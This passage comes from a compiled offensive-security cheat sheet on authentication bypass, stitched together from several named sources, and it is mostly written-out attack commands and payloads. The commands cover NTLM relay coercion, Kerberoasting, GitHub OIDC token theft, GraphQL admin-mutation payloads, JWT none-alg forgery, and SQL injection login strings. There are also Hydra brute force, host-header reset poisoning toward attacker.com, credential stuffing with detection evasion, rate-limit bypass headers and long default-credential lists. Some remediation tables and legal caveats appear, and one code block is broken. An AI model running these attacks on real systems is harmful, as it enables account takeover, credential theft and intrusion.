gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com
```

### NTLM Relay (Active Directory)
```bash
# Coerce authentication via NTLM relay
python3 PetitPotam.py LISTENER_IP TARGET_DC_IP
python3 DFSCoerce.py -u USER -p PASS -d DOMAIN LISTENER_IP TARGET_DC_IP

# Relay to LDAP for privilege escalation
impacket-ntlmrelayx -t ldap://DC_IP --escalate-user attacker
```

### Kerberos Attacks
```bash
# AS-REP Roasting (accounts without pre-auth required)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP -no-pass
hashcat -a 0 -m 18200 hashes.txt rockyou.txt

# Kerberoasting (service accounts with SPNs)
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
hashcat -a 0 -m 13100 spn_hashes.txt rockyou.txt

# mTLS header bypass
curl -H 'X-Forwarded-Client-Cert: Hash=AA;Subject="CN=admin"' https://target.com/admin
```

---

## CI/CD OIDC Token Abuse

### GitHub Actions OIDC Token Extraction
```bash
# Inside GitHub Actions workflow (requires id-token: write permission)
TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)

# Weak AWS trust policy (vulnerable - missing sub restriction)
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:*"
    }
  }
}

# Secure version (restrict to specific repo + branch)
"token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main"
```

### Weak Trust Patterns
```
Missing sub restriction entirely = any GitHub Actions workflow can assume role
Wildcard: "repo:*"            = any repo in any org
No branch restriction         = PR from fork can assume role
No environment restriction    = non-prod can get prod credentials
```

### SCIM Endpoint Abuse
```bash
curl https://target.com/scim/v2/Users
curl https://target.com/scim/v2/Groups
curl https://target.com/scim/v2/ServiceProviderConfig
# May allow unauthenticated user enumeration or account creation
```

### Container Registry Enumeration
```bash
curl https://registry.target.com/v2/_catalog
curl https://registry.target.com/v2/app/tags/list
```

---

## Race Conditions in Authentication

### Single-Packet HTTP/2 Race (Turbo Intruder)
```python
# Burp Turbo Intruder script for single-packet race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, None, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Race Condition Targets
```
# MFA verification race
POST /verify-mfa  code=VALID_OTP  (send 10+ simultaneously)

# Password reset token race
POST /reset-password  token=VALID_TOKEN&password=Pass1!
POST /reset-password  token=VALID_TOKEN&password=Pass2!  (simultaneous)

# Registration race (same email)
POST /register  email=target@example.com&username=user1
POST /register  email=target@example.com&username=user2  (simultaneous)

# Rate limit bypass via race
# Send 50+ login attempts in a single HTTP/2 window
```

### Session Puzzling
```bash
# Step 1: Start password reset (creates auth_email session var)
POST /forgot-password  email=admin@target.com

# Step 2: Immediately visit admin (may inherit reset session context)
GET /admin
# VULNERABLE if /admin reads auth_email instead of fully-authenticated user
```

---

## GraphQL / gRPC / WebSocket Auth Bypass

### GraphQL Introspection (Schema Discovery)
```graphql
# Full schema dump
{ __schema { types { name fields { name type { name } } } } }

# Mutation listing (look for admin mutations)
{ __schema { mutationType { name fields { name args { name } } } } }
```

### GraphQL Auth Bypass Techniques
```graphql
# Batching (bypass rate limits on login)
[{"query": "mutation { login(email:\"admin@t.com\", password:\"pass1\") { token } }"},
 {"query": "mutation { login(email:\"admin@t.com\", password:\"admin\") { token } }"}]

# Aliasing (run operation multiple times in one request)
{ a1: login(email:"admin@t.com", password:"1") { token }
  a2: login(email:"admin@t.com", password:"admin") { token } }

# Unprotected admin mutations
mutation { updateUserRole(userId: "1", role: "admin") { success } }
mutation { deleteUser(userId: "2") { success } }
mutation { createApiKey(userId: "1", scope: "admin") { key } }
mutation { resetPassword(userId: "1", password: "NewPass!") { success } }
mutation { inviteUser(email: "attacker@evil.com", role: "admin") { success } }
```

### gRPC Reflection
```bash
# Discover services
grpcurl -plaintext target:50051 list
grpcurl -plaintext target:50051 describe

# Auth metadata injection
grpcurl -plaintext -H "Authorization: Bearer TOKEN" target:50051 service.Method
grpcurl -plaintext -H "x-user-id: admin" -H "x-role: admin" target:50051 service.AdminMethod
```

### WebSocket CSWSH (Cross-Site WebSocket Hijacking)
```bash
# Test WebSocket with wrong Origin
wscat -c "wss://target.com/ws" --origin "https://evil.com"

# If connection succeeds, craft CSWSH PoC
# Post-auth WebSocket injection
wscat -c "wss://target.com/ws"
# > {"type":"mfa_complete","status":"success"}
# > {"type":"skip_mfa","bypass":true}
# > {"type":"admin_command","cmd":"get_all_users"}
```

---

## Default Credentials

### Web Applications
```
WordPress: admin/admin, admin/password, admin/admin123
Drupal: admin/admin
Joomla: admin/admin, admin/password
Magento: admin/admin123
phpMyAdmin: root/(empty), root/root, root/password
```

### Databases
```
MySQL/MariaDB: root/(empty), root/root, root/password
PostgreSQL: postgres/postgres, postgres/(empty)
MongoDB: (no auth by default), admin/password
Redis: (no auth by default)
MSSQL: sa/sa, sa/(empty), sa/password
Oracle: system/oracle, sys/oracle, dbsnmp/dbsnmp
Cassandra: cassandra/cassandra
CouchDB: admin/admin
Elasticsearch: elastic/changeme
```

### Infrastructure
```
VMware vCenter/ESXi: root/vmware, root/(empty), admin/admin
Kubernetes Dashboard: (token from service account)
Docker Registry: admin/admin, admin/password
Portainer: admin/admin
Grafana: admin/admin
Kibana: elastic/elastic
Jenkins: admin/admin, admin/password
GitLab: root/5iveL!fe (old default)
Prometheus: (no auth by default)
Nagios: nagiosadmin/nagios
```

### Network Devices
```
Cisco IOS: cisco/cisco, (empty)/(empty), admin/cisco
Juniper: root/(empty), admin/admin@123
Fortinet: admin/(empty), admin/admin
Palo Alto: admin/admin
F5 BIG-IP: admin/admin
MikroTik: admin/(empty)
Ubiquiti: ubnt/ubnt
Netgear: admin/password, admin/1234
TP-Link: admin/admin, admin/(empty)
```

### Industrial / IPMI
```
Dell iDRAC: root/calvin
HP iLO: Administrator/(printed on tag)
Supermicro IPMI: admin/admin, ADMIN/ADMIN
IBM IMM: USERID/PASSW0RD
```

---

## Attack Chains

### Chain 1: Account Takeover via Password Reset
```
1. Enumerate valid email via registration/forgot-password response diff
2. Trigger reset with Host: attacker.com (or X-Forwarded-Host)
3. Capture token from attacker's access logs
4. POST /reset-password token=CAPTURED_TOKEN&password=NewPass1!
```

### Chain 2: JWT Weak Secret to Admin Takeover
```
1. Capture JWT from Authorization header or cookie
2. Crack HMAC secret: jwt_tool TOKEN -C -d wordlist.txt
3. Forge new JWT: jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "CRACKED_SECRET"
4. Replace token in requests = admin access
```

### Chain 3: OAuth CSRF + Redirect to Account Takeover
```
1. Enumerate OAuth endpoints: GET /.well-known/oauth-authorization-server
2. Craft auth URL with no state parameter (CSRF) + attacker redirect_uri
3. Social-engineer victim to click URL
4. Capture authorization code at attacker's server
5. Exchange code: POST /oauth/token grant_type=authorization_code&code=CODE
6. Use access token for full account access
```

### Chain 4: SAML XSW + Attribute Injection
```
1. Capture valid SAML response in Burp
2. Load in SAML Raider: Extensions to SAML Raider
3. Apply XSW1 attack + change NameID to admin@target.com
4. Forward modified response to SP's ACS endpoint
5. Access admin resources
```

### Chain 5: CI/CD OIDC to AWS Privilege Escalation
```
1. Identify GitHub Actions workflow with id-token: write
2. Find associated AWS role with weak trust (wildcard sub)
3. Create fork of repo, trigger workflow to request OIDC token
4. Assume AWS role with weak trust policy
5. Enumerate IAM permissions: pacu to run iam__privesc_scan
6. Escalate to admin
```

### Chain 6: MFA Bypass via Race Condition
```
1. Authenticate with valid credentials (get partial-auth session)
2. Obtain valid TOTP code
3. Launch Turbo Intruder single-packet attack: 20 simultaneous /verify-mfa requests
4. First success grants full session before server can invalidate code
5. Use full session to access admin panel
```

---

## Tool Command Reference

### jwt-attacks.sh Usage
```bash
./jwt-attacks.sh TOKEN --decode
./jwt-attacks.sh TOKEN --none-alg
./jwt-attacks.sh TOKEN --strip
./jwt-attacks.sh TOKEN --crack /usr/share/wordlists/rockyou.txt
./jwt-attacks.sh TOKEN --key-confusion public.pem
./jwt-attacks.sh TOKEN --tamper CRACKED_SECRET
./jwt-attacks.sh TOKEN --kid
./jwt-attacks.sh TOKEN --jku https://attacker.com
./jwt-attacks.sh TOKEN --all
```

### Python Tools
```bash
python tools/auth-tester.py https://target.com
python tools/enum-users.py https://target.com --wordlist users.txt
python tools/cloud-iam-tester.py aws
python tools/cloud-iam-tester.py azure
python tools/cloud-iam-tester.py gcp
python tools/framework-bypass-tester.py https://target.com
python tools/graphql-auth-tester.py https://target.com/graphql
python tools/race-condition-tester.py https://target.com
python tools/session-analyzer.py https://target.com
```

### Hydra
```bash
# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# OTP brute force
ffuf -u https://target.com/api/verify-otp -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"otp":"FUZZ"}' -w otp_wordlist.txt -fc 401
```

### sqlmap on Login
```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --dbms=mysql --technique=BEUSTQ
```

### Nuclei Auth Templates
```bash
nuclei -t ~/nuclei-templates/exposures/ -u https://target.com
nuclei -t ~/nuclei-templates/misconfiguration/ -u https://target.com
nuclei -t ~/nuclei-templates/vulnerabilities/generic/auth-bypass.yaml -u https://target.com
```

---

## CVSS & Bug Bounty Impact Reference

| Vulnerability | CVSS Base | Severity | Typical Bounty |
|---|---|---|---|
| Auth bypass (unauthenticated) | 9.8 | Critical | $5k-$50k |
| Account takeover (any user) | 8.8 | High | $2k-$20k |
| MFA bypass | 8.1 | High | $1k-$10k |
| Admin privilege escalation | 8.8 | High | $2k-$15k |
| JWT alg:none | 9.1 | Critical | $3k-$30k |
| Password reset poisoning | 7.5-9.8 | High-Critical | $1k-$10k |
| OAuth account takeover | 8.8 | High | $2k-$20k |
| SAML auth bypass | 9.8 | Critical | $5k-$50k |
| Session fixation | 7.4 | High | $500-$5k |
| Account enumeration | 5.3 | Medium | $100-$500 |
| Weak token entropy | 5.9 | Medium | $200-$2k |

---

## OWASP / Standard Remediations

| Vulnerability Class | Fix |
|---|---|
| JWT algorithm confusion | Hardcode expected algorithm server-side; reject alg:none |
| JWT weak secret | 256-bit+ random secret; prefer RS256/ES256 |
| OAuth missing state | Enforce cryptographically random state; bind to session |
| SAML signature bypass | Verify signature before processing; reject unsigned assertions |
| MFA bypass | Server-side session state machine; block direct endpoint access pre-MFA |
| Password reset poisoning | Use request.host from app config, not HTTP headers |
| Account enumeration | Constant-time responses; identical messages for valid/invalid |
| Session fixation | Regenerate session ID on successful authentication |
| SQL injection | Parameterized queries / prepared statements |
| NoSQL injection | Schema validation; avoid $where / JS evaluation |
| Race condition | Database-level locking; atomic operations; idempotency keys |
| Path traversal bypass | Normalize paths before ACL check; use allowlists |

---

## References

- PortSwigger Web Security Academy: JWT, OAuth, SAML, Authentication labs
- OWASP Testing Guide v4.2 (OTG-AUTHN-*)
- OWASP ASVS v4.0 Section V2 (Authentication)
- NIST SP 800-63B Digital Identity Guidelines
- CVE-2022-21449 (Java ECDSA blank signature)
- CVE-2025-29927 (Next.js middleware bypass)
- CVE-2024-3596 (Blast-RADIUS)
- RFC 7519 (JWT), RFC 6749 (OAuth 2.0), RFC 8693 (Token Exchange), RFC 9449 (DPoP)
- HackerOne Hacktivity: authentication category reports
- Bug Bounty case studies: Instagram $15k (MFA bypass), Microsoft $13k (MFA bypass), Shopify $6k (race condition), Grammarly $5k (OAuth)


---

## From hack-skills: Authentication Bypass Techniques

### SQL Injection Login Bypass

```sql
-- Basic bypass (admin assumed first row):
Username: admin'--
Password: anything

-- Generic (logs in as first user):
Username: ' OR '1'='1'--
Password: anything

-- Variants:
Username: 1' OR '1'='1'/*
Username: admin' OR 'a'='a
```

### Password Reset Vulnerabilities

**Predictable tokens — check for:**
```
Timestamp-based: token=1691234567890
Sequential: token=1001, 1002
MD5(email): echo -n "user@example.com" | md5sum
Short: 4-6 digits (brute-forceable)
```

**Host Header Injection in Reset Email:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com          ← inject attacker domain
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
→ Reset email to victim contains attacker.com link
→ Victim clicks → token captured at attacker.com
```

**Token in Referer leak**: reset page loads third-party analytics → Referer: https://target.com/reset?token=TOKEN leaked to third party.

**Token not expiring / reuse**: use same reset token 48h later; use T1 after already resetting password.

### Account Enumeration

```
Error messages: "User not found" vs "Incorrect password" → enumerate valid usernames
Response timing: valid username causes slower DB lookup
Password reset: "Email not registered" vs generic message
Registration: "Email already registered" → confirms account exists
```

### Brute Force Bypass

```
IP rotation: X-Forwarded-For: 1.1.1.1 → change per request
X-Real-IP: 2.2.2.2

Reverse brute: try ONE password ("password123") across all users
→ no single account lockout

Lockout resets: 9 attempts → wait 30 min → 9 more → repeat
```

### MFA / 2FA Bypass Techniques

```
1. Session before 2FA: after password step, session cookie set
   → directly access /dashboard without completing 2FA page

2. 2FA brute force (if no lockout on 2FA step):
   4-6 digit TOTP = ≤1,000,000 codes → brute with Burp Intruder

3. Code reuse: use same TOTP code twice → server should reject

4. Backup codes: check if rate-limited, single-use, short enough to brute

5. 2FA only on login, not on critical actions:
   DELETE /account checks 2FA? Or just login?
```

### Session Management Flaws

```
Logout invalidation: log in → capture cookie → log out → replay cookie
Session regeneration: low-priv session → admin upgrades role → old cookie has admin?
Predictable tokens: base64(userid+timestamp), sequential IDs, short random (32-bit)
```

### Username Manipulation

```
bcrypt 72-byte truncation: "A"*100 == "A"*72 at login
Null byte: username=admin%00 → truncation in C-string comparison
Unicode normalization: "ⓢcott" normalizes to "scott" → impersonation
```

### OAuth/SSO Account Takeover Patterns

```
Email claim trust:
  1. Create OAuth provider account with email = victim@target.com
  2. Link via that provider → server trusts email claim → account merge

SSO-only account password reset:
  User linked Google SSO, forgot password → "forgot password" sets new password
  → bypasses SSO requirement, enables direct login
```


---

## [Broken Authentication Testing (zebbern)] Additional Techniques

# Broken Authentication Testing

## Purpose

Identify and exploit authentication and session management vulnerabilities in web applications. Broken authentication consistently ranks in the OWASP Top 10 and can lead to account takeover, identity theft, and unauthorized access to sensitive systems. This skill covers testing methodologies for password policies, session handling, multi-factor authentication, and credential management.

## Prerequisites

### Required Knowledge
- HTTP protocol and session mechanisms
- Authentication types (SFA, 2FA, MFA)
- Cookie and token handling
- Common authentication frameworks

### Required Tools
- Burp Suite Professional or Community
- Hydra or similar brute-force tools
- Custom wordlists for credential testing
- Browser developer tools

### Required Access
- Target application URL
- Test account credentials
- Written authorization for testing

## Outputs and Deliverables

1. **Authentication Assessment Report** - Document all identified vulnerabilities
2. **Credential Testing Results** - Brute-force and dictionary attack outcomes
3. **Session Security Analysis** - Token randomness and timeout evaluation
4. **Remediation Recommendations** - Security hardening guidance

## Core Workflow

### Phase 1: Authentication Mechanism Analysis

Understand the application's authentication architecture:

```
# Identify authentication type
- Password-based (forms, basic auth, digest)
- Token-based (JWT, OAuth, API keys)
- Certificate-based (mutual TLS)
- Multi-factor (SMS, TOTP, hardware tokens)

# Map authentication endpoints
/login, /signin, /authenticate
/register, /signup
/forgot-password, /reset-password
/logout, /signout
/api/auth/*, /oauth/*
```

Capture and analyze authentication requests:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test123
```

### Phase 2: Password Policy Testing

Evaluate password requirements and enforcement:

```bash
# Test minimum length (a, ab, abcdefgh)
# Test complexity (password, password1, Password1!)
# Test common weak passwords (123456, password, qwerty, admin)
# Test username as password (admin/admin, test/test)
```

Document policy gaps: Minimum length <8, no complexity, common passwords allowed, username as password.

### Phase 3: Credential Enumeration

Test for username enumeration vulnerabilities:

```bash
# Compare responses for valid vs invalid usernames
# Invalid: "Invalid username" vs Valid: "Invalid password"
# Check timing differences, response codes, registration messages
```

# Password reset
"Email sent if account exists" (secure)
"No account with that email" (leaks info)

# API responses
{"error": "user_not_found"}
{"error": "invalid_password"}
```

### Phase 4: Brute Force Testing

Test account lockout and rate limiting:

```bash
# Using Hydra for form-based auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Using Burp Intruder
1. Capture login request
2. Send to Intruder
3. Set payload positions on password field
4. Load wordlist
5. Start attack
6. Analyze response lengths/codes
```

Check for protections:

```bash
# Account lockout
- After how many attempts?
- Duration of lockout?
- Lockout notification?

# Rate limiting
- Requests per minute limit?
- IP-based or account-based?
- Bypass via headers (X-Forwarded-For)?

# CAPTCHA
- After failed attempts?
- Easily bypassable?
```

### Phase 5: Credential Stuffing

Test with known breached credentials:

```bash
# Credential stuffing differs from brute force
# Uses known email:password pairs from breaches

# Using Burp Intruder with Pitchfork attack
1. Set username and password as positions
2. Load email list as payload 1
3. Load password list as payload 2 (matched pairs)
4. Analyze for successful logins

# Detection evasion
- Slow request rate
- Rotate source IPs
- Randomize user agents
- Add delays between attempts
```

### Phase 6: Session Management Testing

Analyze session token security:

```bash
# Capture session cookie
Cookie: SESSIONID=abc123def456

# Test token characteristics
1. Entropy - Is it random enough?
2. Length - Sufficient length (128+ bits)?
3. Predictability - Sequential patterns?
4. Secure flags - HttpOnly, Secure, SameSite?
```

Session token analysis:

```python
#!/usr/bin/env python3
import requests
import hashlib

# Collect multiple session tokens
tokens = []
for i in range(100):
    response = requests.get("https://target.com/login")
    token = response.cookies.get("SESSIONID")
    tokens.append(token)

# Analyze for patterns
# Check for sequential increments
# Calculate entropy
# Look for timestamp components
```

### Phase 7: Session Fixation Testing

Test if session is regenerated after authentication:

```bash
# Step 1: Get session before login
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=abc123

# Step 2: Login with same session
POST /login HTTP/1.1
Cookie: SESSIONID=abc123
username=valid&password=valid

# Step 3: Check if session changed
# VULNERABLE if SESSIONID remains abc123
# SECURE if new session assigned after login
```

Attack scenario:

```bash
# Attacker workflow:
1. Attacker visits site, gets session: SESSIONID=attacker_session
2. Attacker sends link to victim with fixed session:
   https://target.com/login?SESSIONID=attacker_session
3. Victim logs in with attacker's session
4. Attacker now has authenticated session
```

### Phase 8: Session Timeout Testing

Verify session expiration policies:

```bash
# Test idle timeout
1. Login and note session cookie
2. Wait without activity (15, 30, 60 minutes)
3. Attempt to use session
4. Check if session is still valid

# Test absolute timeout
1. Login and continuously use session
2. Check if forced logout after set period (8 hours, 24 hours)

# Test logout functionality
1. Login and note session
2. Click logout
3. Attempt to reuse old session cookie
4. Session should be invalidated server-side
```

### Phase 9: Multi-Factor Authentication Testing

Assess MFA implementation security:

```bash
# OTP brute force
- 4-digit OTP = 10,000 combinations
- 6-digit OTP = 1,000,000 combinations
- Test rate limiting on OTP endpoint

# OTP bypass techniques
- Skip MFA step by direct URL access
- Modify response to indicate MFA passed
- Null/empty OTP submission
- Previous valid OTP reuse

# API Version Downgrade Attack (crAPI example)
# If /api/v3/check-otp has rate limiting, try older versions:
POST /api/v2/check-otp
{"otp": "1234"}
# Older API versions may lack security controls

# Using Burp for OTP testing
1. Capture OTP verification request
2. Send to Intruder
3. Set OTP field as payload position
4. Use numbers payload (0000-9999)
5. Check for successful bypass
```

Test MFA enrollment:

```bash
# Forced enrollment
- Can MFA be skipped during setup?
- Can backup codes be accessed without verification?

# Recovery process
- Can MFA be disabled via email alone?
- Social engineering potential?
```

### Phase 10: Password Reset Testing

Analyze password reset security:

```bash
# Token security
1. Request password reset
2. Capture reset link
3. Analyze token:
   - Length and randomness
   - Expiration time
   - Single-use enforcement
   - Account binding

# Token manipulation
https://target.com/reset?token=abc123&user=victim
# Try changing user parameter while using valid token

# Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Reset email may contain attacker's domain
```

## Quick Reference

### Common Vulnerability Types

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Weak passwords | High | Policy testing, dictionary attack |
| No lockout | High | Brute force testing |
| Username enumeration | Medium | Differential response analysis |
| Session fixation | High | Pre/post-login session comparison |
| Weak session tokens | High | Entropy analysis |
| No session timeout | Medium | Long-duration session testing |
| Insecure password reset | High | Token analysis, workflow bypass |
| MFA bypass | Critical | Direct access, response manipulation |

### Credential Testing Payloads

```bash
# Default credentials
admin:admin
admin:password
admin:123456
root:root
test:test
user:user

# Common passwords
123456
password
12345678
qwerty
abc123
password1
admin123

# Breached credential databases
- Have I Been Pwned dataset
- SecLists passwords
- Custom targeted lists
```

### Session Cookie Flags

| Flag | Purpose | Vulnerability if Missing |
|------|---------|------------------------|
| HttpOnly | Prevent JS access | XSS can steal session |
| Secure | HTTPS only | Sent over HTTP |
| SameSite | CSRF protection | Cross-site requests allowed |
| Path | URL scope | Broader exposure |
| Domain | Domain scope | Subdomain access |
| Expires | Lifetime | Persistent sessions |

### Rate Limiting Bypass Headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Avoid testing with real breached credentials
- Do not access actual user accounts
- Document all testing activities

### Technical Limitations
- CAPTCHA may prevent automated testing
- Rate limiting affects brute force timing
- MFA significantly increases attack difficulty
- Some vulnerabilities require victim interaction

### Scope Considerations
- Test accounts may behave differently than production
- Some features may be disabled in test environments
- Third-party authentication may be out of scope
- Production testing requires extra caution

## Examples

### Example 1: Account Lockout Bypass

**Scenario:** Test if account lockout can be bypassed

```bash
# Step 1: Identify lockout threshold
# Try 5 wrong passwords for admin account
# Result: "Account locked for 30 minutes"

# Step 2: Test bypass via IP rotation
# Use X-Forwarded-For header
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Increment IP for each attempt
X-Forwarded-For: 192.168.1.2
# Continue until successful or confirmed blocked

# Step 3: Test bypass via case manipulation
username=Admin (vs admin)
username=ADMIN
# Some systems treat these as different accounts
```

### Example 2: JWT Token Attack

**Scenario:** Exploit weak JWT implementation

```bash
# Step 1: Capture JWT token
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature

# Step 2: Decode and analyze
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user":"test","role":"user"}

# Step 3: Try "none" algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

# Step 4: Submit modified token
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Example 3: Password Reset Token Exploitation

**Scenario:** Test password reset functionality

```bash
# Step 1: Request reset for test account
POST /forgot-password
email=test@example.com

# Step 2: Capture reset link
https://target.com/reset?token=a1b2c3d4e5f6

# Step 3: Test token properties
# Reuse: Try using same token twice
# Expiration: Wait 24+ hours and retry
# Modification: Change characters in token

# Step 4: Test for user parameter manipulation
https://target.com/reset?token=a1b2c3d4e5f6&email=admin@example.com
# Check if admin's password can be reset with test user's token
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Brute force too slow | Identify rate limit scope; IP rotation; add delays; use targeted wordlists |
| Session analysis inconclusive | Collect 1000+ tokens; use statistical tools; check for timestamps; compare accounts |
| MFA cannot be bypassed | Document as secure; test backup/recovery mechanisms; check MFA fatigue; verify enrollment |
| Account lockout prevents testing | Request multiple test accounts; test threshold first; use slower timing |


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

## Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

### SSH certificate-authority trust forgery (Git-hosting / enterprise platforms)
When an org or instance registers an SSH certificate authority, cert `principals` may not be bound server-side to the requesting identity — a member can mint a cert asserting another user's principal and authenticate as them (e.g. modify another user's resource given only its URL). Add SSH-CA trust to the auth-surface list on Git-hosting targets; niche/platform-specific. Disclosed: reports/1901040.

## Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

## Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

## Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
